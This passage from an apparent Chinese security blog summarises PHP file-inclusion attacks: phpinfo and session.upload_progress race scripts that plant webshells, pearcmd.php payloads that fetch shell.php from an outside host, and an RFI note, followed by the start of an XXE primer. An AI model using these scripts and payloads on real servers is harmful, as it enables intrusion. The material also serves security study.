<p>1：发送包含了<code>webshell</code>的上传数据包给<code>phpinfo</code>页面，这个数据包的<code>header</code>、<code>get</code>等位置需要塞满垃圾数据<br>2：因为<code>phpinfo</code>页面会将所有数据都打印出来，1中的垃圾数据会将整个<code>phpinfo</code>页面撑得非常大<br>3：<code>php</code>默认的输出缓冲区大小为<code>4096</code>，可以理解为<code>php</code>每次返回<code>4096</code>个字节给<code>socket</code>连接<br>4：所以，我们直接操作原生<code>socket</code>，每次读取<code>4096</code>个字节。只要读取到的字符里包含临时文件名，就立即发送第二个数据包<br>5：此时，第一个数据包的<code>socket</code>连接实际上还没结束，因为<code>php</code>还在继续每次输出<code>4096</code>个字节，所以临时文件此时还没有删除<br>6：利用这个时间差，第二个数据包，也就是文件包含漏洞的利用，即可成功包含临时文件，最终<code>getshell</code></p>
<p>脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span><br><span class="hljs-comment"># python2 exp.py your-ip 8080 100</span><br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> threading<br><span class="hljs-keyword">import</span> socket<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">setup</span>(<span class="hljs-params">host, port</span>):<br>    TAG=<span class="hljs-string">&quot;Security Test&quot;</span><br>    PAYLOAD=<span class="hljs-string">&quot;&quot;&quot;%s\r</span><br><span class="hljs-string">&lt;?php file_put_contents(&#x27;/tmp/g&#x27;, &#x27;&lt;?=eval($_REQUEST[1])?&gt;&#x27;)?&gt;\r&quot;&quot;&quot;</span> % TAG<br>    REQ1_DATA=<span class="hljs-string">&quot;&quot;&quot;-----------------------------7dbff1ded0714\r</span><br><span class="hljs-string">Content-Disposition: form-data; name=&quot;dummyname&quot;; filename=&quot;test.txt&quot;\r</span><br><span class="hljs-string">Content-Type: text/plain\r</span><br><span class="hljs-string">\r</span><br><span class="hljs-string">%s</span><br><span class="hljs-string">-----------------------------7dbff1ded0714--\r&quot;&quot;&quot;</span> % PAYLOAD<br>    padding=<span class="hljs-string">&quot;A&quot;</span> * <span class="hljs-number">5000</span><br>    REQ1=<span class="hljs-string">&quot;&quot;&quot;POST /phpinfo.php?a=&quot;&quot;&quot;</span>+padding+<span class="hljs-string">&quot;&quot;&quot; HTTP/1.1\r</span><br><span class="hljs-string">Cookie: PHPSESSID=q249llvfromc1or39t6tvnun42; othercookie=&quot;&quot;&quot;</span>+padding+<span class="hljs-string">&quot;&quot;&quot;\r</span><br><span class="hljs-string">HTTP_ACCEPT: &quot;&quot;&quot;</span> + padding + <span class="hljs-string">&quot;&quot;&quot;\r</span><br><span class="hljs-string">HTTP_USER_AGENT: &quot;&quot;&quot;</span>+padding+<span class="hljs-string">&quot;&quot;&quot;\r</span><br><span class="hljs-string">HTTP_ACCEPT_LANGUAGE: &quot;&quot;&quot;</span>+padding+<span class="hljs-string">&quot;&quot;&quot;\r</span><br><span class="hljs-string">HTTP_PRAGMA: &quot;&quot;&quot;</span>+padding+<span class="hljs-string">&quot;&quot;&quot;\r</span><br><span class="hljs-string">Content-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714\r</span><br><span class="hljs-string">Content-Length: %s\r</span><br><span class="hljs-string">Host: %s\r</span><br><span class="hljs-string">\r</span><br><span class="hljs-string">%s&quot;&quot;&quot;</span> %(<span class="hljs-built_in">len</span>(REQ1_DATA),host,REQ1_DATA)<br>    <span class="hljs-comment">#modify this to suit the LFI script</span><br>    LFIREQ=<span class="hljs-string">&quot;&quot;&quot;GET /lfi.php?file=%s HTTP/1.1\r</span><br><span class="hljs-string">User-Agent: Mozilla/4.0\r</span><br><span class="hljs-string">Proxy-Connection: Keep-Alive\r</span><br><span class="hljs-string">Host: %s\r</span><br><span class="hljs-string">\r</span><br><span class="hljs-string">\r</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>    <span class="hljs-keyword">return</span> (REQ1, TAG, LFIREQ)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">phpInfoLFI</span>(<span class="hljs-params">host, port, phpinforeq, offset, lfireq, tag</span>):<br>    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>    s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br><br>    s.connect((host, port))<br>    s2.connect((host, port))<br><br>    s.send(phpinforeq)<br>    d = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-built_in">len</span>(d) &lt; offset:<br>        d += s.recv(offset)<br>    <span class="hljs-keyword">try</span>:<br>        i = d.index(<span class="hljs-string">&quot;[tmp_name] =&amp;gt; &quot;</span>)<br>        fn = d[i+<span class="hljs-number">17</span>:i+<span class="hljs-number">31</span>]<br>    <span class="hljs-keyword">except</span> ValueError:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br>    s2.send(lfireq % (fn, host))<br>    d = s2.recv(<span class="hljs-number">4096</span>)<br>    s.close()<br>    s2.close()<br><br>    <span class="hljs-keyword">if</span> d.find(tag) != -<span class="hljs-number">1</span>:<br>        <span class="hljs-keyword">return</span> fn<br><br>counter=<span class="hljs-number">0</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">ThreadWorker</span>(threading.Thread):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, e, l, m, *args</span>):<br>        threading.Thread.__init__(self)<br>        self.event = e<br>        self.lock =  l<br>        self.maxattempts = m<br>        self.args = args<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">global</span> counter<br>        <span class="hljs-keyword">while</span> <span class="hljs-keyword">not</span> self.event.is_set():<br>            <span class="hljs-keyword">with</span> self.lock:<br>                <span class="hljs-keyword">if</span> counter &gt;= self.maxattempts:<br>                    <span class="hljs-keyword">return</span><br>                counter+=<span class="hljs-number">1</span><br><br>            <span class="hljs-keyword">try</span>:<br>                x = phpInfoLFI(*self.args)<br>                <span class="hljs-keyword">if</span> self.event.is_set():<br>                    <span class="hljs-keyword">break</span><br>                <span class="hljs-keyword">if</span> x:<br>                    <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;\nGot it! Shell created in /tmp/g&quot;</span><br>                    self.event.<span class="hljs-built_in">set</span>()<br><br>            <span class="hljs-keyword">except</span> socket.error:<br>                <span class="hljs-keyword">return</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getOffset</span>(<span class="hljs-params">host, port, phpinforeq</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;Gets offset of tmp_name in the php output&quot;&quot;&quot;</span><br>    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>    s.connect((host,port))<br>    s.send(phpinforeq)<br><br>    d = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        i = s.recv(<span class="hljs-number">4096</span>)<br>        d+=i<br>        <span class="hljs-keyword">if</span> i == <span class="hljs-string">&quot;&quot;</span>:<br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-comment"># detect the final chunk</span><br>        <span class="hljs-keyword">if</span> i.endswith(<span class="hljs-string">&quot;0\r\n\r\n&quot;</span>):<br>            <span class="hljs-keyword">break</span><br>    s.close()<br>    i = d.find(<span class="hljs-string">&quot;[tmp_name] =&amp;gt; &quot;</span>)<br>    <span class="hljs-keyword">if</span> i == -<span class="hljs-number">1</span>:<br>        <span class="hljs-keyword">raise</span> ValueError(<span class="hljs-string">&quot;No php tmp_name in phpinfo output&quot;</span>)<br><br>    <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;found %s at %i&quot;</span> % (d[i:i+<span class="hljs-number">10</span>],i)<br>    <span class="hljs-comment"># padded up a bit</span><br>    <span class="hljs-keyword">return</span> i+<span class="hljs-number">256</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br><br>    <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;LFI With PHPInfo()&quot;</span><br>    <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;-=&quot;</span> * <span class="hljs-number">30</span><br><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) &lt; <span class="hljs-number">2</span>:<br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;Usage: %s host [port] [threads]&quot;</span> % sys.argv[<span class="hljs-number">0</span>]<br>        sys.exit(<span class="hljs-number">1</span>)<br><br>    <span class="hljs-keyword">try</span>:<br>        host = socket.gethostbyname(sys.argv[<span class="hljs-number">1</span>])<br>    <span class="hljs-keyword">except</span> socket.error, e:<br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;Error with hostname %s: %s&quot;</span> % (sys.argv[<span class="hljs-number">1</span>], e)<br>        sys.exit(<span class="hljs-number">1</span>)<br><br>    port=<span class="hljs-number">80</span><br>    <span class="hljs-keyword">try</span>:<br>        port = <span class="hljs-built_in">int</span>(sys.argv[<span class="hljs-number">2</span>])<br>    <span class="hljs-keyword">except</span> IndexError:<br>        <span class="hljs-keyword">pass</span><br>    <span class="hljs-keyword">except</span> ValueError, e:<br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;Error with port %d: %s&quot;</span> % (sys.argv[<span class="hljs-number">2</span>], e)<br>        sys.exit(<span class="hljs-number">1</span>)<br><br>    poolsz=<span class="hljs-number">10</span><br>    <span class="hljs-keyword">try</span>:<br>        poolsz = <span class="hljs-built_in">int</span>(sys.argv[<span class="hljs-number">3</span>])<br>    <span class="hljs-keyword">except</span> IndexError:<br>        <span class="hljs-keyword">pass</span><br>    <span class="hljs-keyword">except</span> ValueError, e:<br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;Error with poolsz %d: %s&quot;</span> % (sys.argv[<span class="hljs-number">3</span>], e)<br>        sys.exit(<span class="hljs-number">1</span>)<br><br>    <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;Getting initial offset...&quot;</span>,<br>    reqphp, tag, reqlfi = setup(host, port)<br>    offset = getOffset(host, port, reqphp)<br>    sys.stdout.flush()<br><br>    maxattempts = <span class="hljs-number">1000</span><br>    e = threading.Event()<br>    l = threading.Lock()<br><br>    <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;Spawning worker pool (%d)...&quot;</span> % poolsz<br>    sys.stdout.flush()<br><br>    tp = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,poolsz):<br>        tp.append(ThreadWorker(e,l,maxattempts, host, port, reqphp, offset, reqlfi, tag))<br><br>    <span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> tp:<br>        t.start()<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">while</span> <span class="hljs-keyword">not</span> e.wait(<span class="hljs-number">1</span>):<br>            <span class="hljs-keyword">if</span> e.is_set():<br>                <span class="hljs-keyword">break</span><br>            <span class="hljs-keyword">with</span> l:<br>                sys.stdout.write( <span class="hljs-string">&quot;\r% 4d / % 4d&quot;</span> % (counter, maxattempts))<br>                sys.stdout.flush()<br>                <span class="hljs-keyword">if</span> counter &gt;= maxattempts:<br>                    <span class="hljs-keyword">break</span><br>        <span class="hljs-built_in">print</span><br>        <span class="hljs-keyword">if</span> e.is_set():<br>            <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;Woot!  \m/&quot;</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;:(&quot;</span><br>    <span class="hljs-keyword">except</span> KeyboardInterrupt:<br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;\nTelling threads to shutdown...&quot;</span><br>        e.<span class="hljs-built_in">set</span>()<br><br>    <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;Shuttin&#x27; down...&quot;</span><br>    <span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> tp:<br>        t.join()<br><br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br></code></pre></td></tr></table></figure>


<h2 id="session-upload-progress文件包含"><a href="#session-upload-progress文件包含" class="headerlink" title="session.upload_progress文件包含"></a>session.upload_progress文件包含</h2><p>会话机制(session)在PHP中用于保持用户连续访问Web应用时的相关数据。</p>
<p><code>PHP</code>将<code>session</code>以文件的形式存储在服务器某个文件中，可以在<code>php.ini</code>里面设置<code>session</code>的存储位置<code>session.save_path</code></p>
<p>默认路径</p>
<figure class="highlight text"><table><tr><td class="code"><pre><code class="hljs text">/var/lib/php/sess_PHPSESSID<br>/var/lib/php/sessions/sess_PHPSESSID<br>/tmp/sess_PHPSESSID<br>/tmp/sessions/sess_PHPSESSID<br></code></pre></td></tr></table></figure>


<p>再看下在<code>php.ini</code>中关于<code>session</code>和<code>upload_progress</code>的几个默认配置</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php">session.upload_progress.enabled = on<br>session.upload_progress.cleanup = on<br>session.upload_progress.prefix = <span class="hljs-string">&quot;upload_progress_&quot;</span><br>session.upload_progress.name = <span class="hljs-string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span><br>session.upload_progress.freq = <span class="hljs-string">&quot;1%&quot;</span><br>session.upload_progress.min_freq = <span class="hljs-string">&quot;1&quot;</span><br>session.use_strict_mode = <span class="hljs-string">&quot;0&quot;</span><br></code></pre></td></tr></table></figure>


<blockquote>
<p>enabled&#x3D;on表示upload_progress功能开始，也意味着当浏览器向服务器上传一个文件时，php将会把此次文件上传的详细信息(如上传时间、上传进度等)存储在session当中；<br>cleanup&#x3D;on表示当文件上传结束后，php将会立即清空对应session文件中的内容；<br>name当它出现在表单中，php将会报告上传进度，最大的好处是，它的值可控；<br>prefix+name将表示为session中的键名;</p>
</blockquote>
<p>其中<code>session.use_strict_mode</code>默认值为<code>0</code>，此时用户是可以自己定义<code>Session ID</code>的，比如在<code>Cookie</code>里设置<code>PHPSESSID=lewiserii</code>，<code>PHP</code>将会在服务器上创建一个文件：<code>/tmp/sess_lewiserii</code></p>
<p>然后在<code>PHP_SESSION_UPLOAD_PROGRESS</code>下添加一句话木马，这样就会往指定的<code>session</code>文件中写入我们想要的内容</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93-11.png"></p>
<p>然后<code>?file=/tmp/sess_lewiserii</code>包含即可</p>
<p>但是要注意<code>session.upload_progress.cleanup</code>默认是开启的，一旦读取了所有POST数据，它就会清空对应session文件中的内容，所以需要利用条件竞争来包含</p>
<p>使用bp同时不断的发post传文件的包和文件包含的包或者使用脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> io<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> threading<br><br>sessid = <span class="hljs-string">&#x27;ctf&#x27;</span><br>sess_path=<span class="hljs-string">&#x27;/tmp&#x27;</span><br>url=<span class="hljs-string">&#x27;http://c0648e39-a4bb-4776-88f0-a5cf98e9f640.challenge.ctf.show/&#x27;</span><br>cmd=<span class="hljs-string">&#x27;ls /&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">WRITE</span>(<span class="hljs-params">session</span>):<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        f = io.BytesIO(<span class="hljs-string">b&#x27;x&#x27;</span> * <span class="hljs-number">1024</span> * <span class="hljs-number">50</span>)<br>        session.post(<br>            url=url,<br>            data=&#123;<span class="hljs-string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span>:<span class="hljs-string">f&quot;&lt;?php system(&#x27;<span class="hljs-subst">&#123;cmd&#125;</span>&#x27;);?&gt;&quot;</span>&#125;,<br>            files=&#123;<span class="hljs-string">&quot;file&quot;</span>:(<span class="hljs-string">&#x27;xxx.txt&#x27;</span>, f)&#125;,<br>            cookies=&#123;<span class="hljs-string">&#x27;PHPSESSID&#x27;</span>:sessid&#125;<br>        )<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">READ</span>(<span class="hljs-params">session</span>):<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        response = session.get(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;url&#125;</span>?file=<span class="hljs-subst">&#123;sess_path&#125;</span>/sess_<span class="hljs-subst">&#123;sessid&#125;</span>&#x27;</span>)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;upload_progress_&#x27;</span> <span class="hljs-keyword">in</span> response.text:<br>            <span class="hljs-built_in">print</span>(response.text)<br>            sys.exit(<span class="hljs-number">0</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;++++++retry++++++&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    <span class="hljs-keyword">with</span> requests.session() <span class="hljs-keyword">as</span> session:<br>        t1 = threading.Thread(target=WRITE, args=(session,))<br>        t1.daemon = <span class="hljs-literal">True</span><br>        t1.start()<br>        READ(session)<br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    main()<br></code></pre></td></tr></table></figure>



<h2 id="pear文件包含"><a href="#pear文件包含" class="headerlink" title="pear文件包含"></a>pear文件包含</h2><p>利用条件<br>1：有文件包含点<br>2：开启了<code>pear</code>扩展<br>3：配置文件中<code>register_argc_argv</code>设置为<code>On</code>，而默认为<code>Off</code></p>
<blockquote>
<p>PEAR是为PHP扩展与应用库(PHP Extension and Application Repository)，它是一个PHP扩展及应用的一个代码仓库，类似于composer，用于代码的下载与管理。默认安装位置：<code>/usr/local/lib/php</code></p>
</blockquote>
<p>那么这个<code>register_argc_argv</code>能干什么呢？简言之，可以通过<code>$_SERVER[&#39;argv&#39;]</code>获得命令行参数，其中以<code>+</code>作为分隔符</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93-12.png"></p>
<p>在<code>pear</code>目录下有一个<code>pearcmd.php</code>，是<code>pear</code>命令调用的文件，是用来管理依赖的，类似python的pip。能包含它又能给参数的话，就可以用它来写木马了</p>
<h3 id="靶机可出网"><a href="#靶机可出网" class="headerlink" title="靶机可出网"></a>靶机可出网</h3><p>远程文件下载</p>
<p>命令行语法：<code>pear install -R /tmp http://vps/shell.php</code></p>
<p>用<code>install</code>会下载到<code>/tmp/pear</code>目录下，用<code>download</code>会下载到当前目录，当然也可以用<code>-R</code>指定目录</p>
<figure class="highlight text"><table><tr><td class="code"><pre><code class="hljs text">/?file=/usr/local/lib/php/pearcmd.php&amp;+install+http://your-shell.com/shell.php<br>/?file=/usr/local/lib/php/pearcmd.php&amp;+install+-R+/var/www/html/+http://your-shell.com/shell.php<br>/?file=/usr/local/lib/php/pearcmd.php&amp;+download+http://your-shell.com/shell.php<br></code></pre></td></tr></table></figure>

<h3 id="靶机不出网"><a href="#靶机不出网" class="headerlink" title="靶机不出网"></a>靶机不出网</h3><p>写shell</p>
<figure class="highlight text"><table><tr><td class="code"><pre><code class="hljs text">/?file=/usr/local/lib/php/pearcmd.php&amp;+config-create+/&lt;?=eval($_POST[a])?&gt;+/tmp/shell.php<br>/?file=/usr/local/lib/php/pearcmd.php&amp;aaaa+config-create+/var/www/html/&lt;?=`$_POST[a]`;?&gt;+1.php<br></code></pre></td></tr></table></figure>


<p>生成配置文件，配置项传入我们恶意的php代码</p>
<figure class="highlight text"><table><tr><td class="code"><pre><code class="hljs text">/?file=/usr/local/lib/php/pearcmd.php&amp;+-c+/tmp/ctf.php+-d+man_dir=&lt;?eval($_POST[1]);?&gt;+-s+<br></code></pre></td></tr></table></figure>


<h2 id="绕过包含次数限制"><a href="#绕过包含次数限制" class="headerlink" title="绕过包含次数限制"></a>绕过包含次数限制</h2><p>例题</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">require_once</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;content&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$content</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;content&#x27;</span>];<br>    <span class="hljs-keyword">require_once</span>(<span class="hljs-variable">$content</span>);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>因为<code>include_once</code>，<code>require_once</code>对于同一个文件只能包含一次，已经包含了<code>flag.php</code>一次了，那么就没办法继续包含它了吗？</p>
<p>payload:<br><code>php://filter/convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php</code></p>
<p>路径中的<code>/proc/self/root</code>就表示<code>/</code></p>
<p>具体分析原理的文章：<a href="https://www.anquanke.com/post/id/213235">php源码分析 require_once 绕过不能重复包含文件的限制</a></p>
<h2 id="Iconv-LFI"><a href="#Iconv-LFI" class="headerlink" title="Iconv LFI"></a>Iconv LFI</h2><p>其中的原理这篇<a href="https://tttang.com/archive/1395/">文章</a>写的非常详细了</p>
<p>因为不同的靶机环境有不同的字符集，所以可能会打不通，这时可以先fuzz一下，得到更为通用的字符集构造的POC</p>
<p><a href="https://github.com/wupco/PHP_INCLUDE_TO_SHELL_CHAR_DICT">fuzz脚本</a></p>
<h1 id="RFI"><a href="#RFI" class="headerlink" title="RFI"></a>RFI</h1><p>远程文件包含（Remote File Inclusion， RFI）是指包含远程服务器上的文件，需要在<code>php.ini</code>中设置<code>allow_url_include=On</code></p>
<p>远程包含与本地包含没有区别，无非是支持远程加载，更容易getshell，无论是哪种扩展名，只要遵循PHP语法规范，PHP解析器就会对其解析。</p>
<p>如果过滤了点可以将<code>ip</code>转为<code>int</code></p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93-4.png"></p>
<p>参考文章1：<a href="https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html">Docker PHP裸文件本地包含综述</a><br>参考文章2：<a href="http://www.gem-love.com/2022/06/26/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%9A%84%E5%87%A0%E7%A7%8D%E4%B8%8D%E5%B8%B8%E8%A7%84%E5%88%A9%E7%94%A8%E5%A7%BF%E5%8A%BF/">文件包含的几种不常规利用姿势</a></p>
]]></content>
      <categories>
        <category>总结</category>
      </categories>
      <tags>
        <tag>总结</tag>
        <tag>文件包含</tag>
      </tags>
  </entry>
  <entry>
    <title>xxe学习总结</title>
    <url>/%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/xxe%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93.html</url>
    <content><![CDATA[<h1 id="从XML到XXE"><a href="#从XML到XXE" class="headerlink" title="从XML到XXE"></a>从XML到XXE</h1><h2 id="XML"><a href="#XML" class="headerlink" title="XML"></a>XML</h2><p><strong>什么是 XML？</strong><br>XML 指可扩展标记语言（EXtensible Markup Language）。<br>XML 的设计宗旨是传输数据，而不是显示数据。<br>XML 是 W3C 的推荐标准。<br>XML 不会做任何事情。XML 被设计用来结构化、存储以及传输信息。<br>XML 语言没有预定义的标签。</p>
<p><strong>XML 和 HTML 之间的差异</strong><br>XML 不是 HTML 的替代。<br>XML 和 HTML 为不同的目的而设计：</p>
<blockquote>
<p>XML 被设计用来传输和存储数据，其焦点是数据的内容。<br>HTML 被设计用来显示数据，其焦点是数据的外观。<br>HTML 旨在显示信息，而 XML 旨在传输信息。</p>
</blockquote>
<p>XML文档结构包括<code>XML声明</code>、<code>DTD文档类型定义（可选）</code>、<code>文档元素</code>。</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!--XML申明--&gt;</span><br><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span>?&gt;</span><br><br><span class="hljs-comment">&lt;!--文档类型定义--&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">note</span> [  &lt;!--定义此文档是 note 类型的文档--&gt;</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-keyword">note</span> (<span class="hljs-keyword">to</span>,<span class="hljs-keyword">from</span>,<span class="hljs-keyword">heading</span>,<span class="hljs-keyword">body</span>)&gt;</span>  &lt;!--定义note元素有四个元素--&gt;</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-keyword">to</span> (<span class="hljs-keyword">#PCDATA</span>)&gt;</span>     &lt;!--定义to元素为”#PCDATA”类型--&gt;</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-keyword">from</span> (<span class="hljs-keyword">#PCDATA</span>)&gt;</span>   &lt;!--定义from元素为”#PCDATA”类型--&gt;</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-keyword">head</span> (<span class="hljs-keyword">#PCDATA</span>)&gt;</span>   &lt;!--定义head元素为”#PCDATA”类型--&gt;</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-keyword">body</span> (<span class="hljs-keyword">#PCDATA</span>)&gt;</span>   &lt;!--定义body元素为”#PCDATA”类型--&gt;</span><br><span class="hljs-meta">]&gt;</span><br><br><span class="hljs-comment">&lt;!--文档元素--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">note</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">to</span>&gt;</span>Dave<span class="hljs-tag">&lt;/<span class="hljs-name">to</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">from</span>&gt;</span>Tom<span class="hljs-tag">&lt;/<span class="hljs-name">from</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>Reminder<span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>You are a good man<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">note</span>&gt;</span><br></code></pre></td></tr></table></figure>


<h2 id="DTD"><a href="#DTD" class="headerlink" title="DTD"></a>DTD</h2><p>DTD(文档类型定义，Document Type Definition )的作用是定义<code>XML</code>文档的合法构建模块。它使用一系列的合法元素来定义文档结构。</p>
<h3 id="DTD引用方式"><a href="#DTD引用方式" class="headerlink" title="DTD引用方式"></a>DTD引用方式</h3><p>1）DTD 内部声明<br><code>&lt;!DOCTYPE 根元素 [元素声明]&gt;</code></p>
<p>2）DTD 外部引用<br><code>&lt;!DOCTYPE 根元素名称 SYSTEM &quot;外部DTD的URI&quot;&gt;</code></p>
<p>3）引用公共DTD<br><code>&lt;!DOCTYPE 根元素名称 PUBLIC &quot;DTD标识名&quot; &quot;公用DTD的URI&quot;&gt;</code></p>
<h3 id="DTD-关键字"><a href="#DTD-关键字" class="headerlink" title="DTD 关键字"></a>DTD 关键字</h3><ul>
<li>DOCTYPE（DTD的声明）</li>
<li>ENTITY（实体的声明）</li>
<li>SYSTEM、PUBLIC（外部资源申请）</li>
<li>ELEMENT（定义元素声明）</li>
</ul>
<h2 id="实体"><a href="#实体" class="headerlink" title="实体"></a>实体</h2><p>实体可以理解为变量，其必须在DTD中定义申明，可以在文档中的其他位置引用该变量的值。<br>实体按类型主要分为以下四种：</p>
<ul>
<li>内置实体 (Built-in entities)</li>
<li>字符实体 (Character entities)</li>
<li>通用实体&#x2F;普通实体 (General entities)</li>
<li>参数实体 (Parameter entities)</li>
</ul>
<p><strong>内置实体</strong></p>
<figure class="highlight text"><table><tr><td class="code"><pre><code class="hljs text">&amp;符号: &amp;amp;<br>单引号: &amp;apos;<br>＞: &amp;gt;<br>＜: &amp;lt;<br>双引号: &amp;quot;<br></code></pre></td></tr></table></figure>

<p><strong>字符实体</strong></p>
<p>通常是<code>html</code>的实体编码，例如：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version = <span class="hljs-string">&quot;1.0&quot;</span> encoding = <span class="hljs-string">&quot;UTF-8&quot;</span> standalone = <span class="hljs-string">&quot;yes&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">author</span>[</span><br><span class="hljs-meta">   <span class="hljs-meta">&lt;!ELEMENT <span class="hljs-keyword">author</span> (<span class="hljs-keyword">#PCDATA</span>)&gt;</span></span><br><span class="hljs-meta">   <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">copyright</span> <span class="hljs-string">&quot;&amp;#169;&quot;</span>&gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">author</span>&gt;</span><span class="hljs-symbol">&amp;writer;</span><span class="hljs-symbol">&amp;copyright;</span><span class="hljs-tag">&lt;/<span class="hljs-name">author</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p><code>&amp;#169</code>即<code>©</code></p>
<p><strong>普通实体</strong></p>
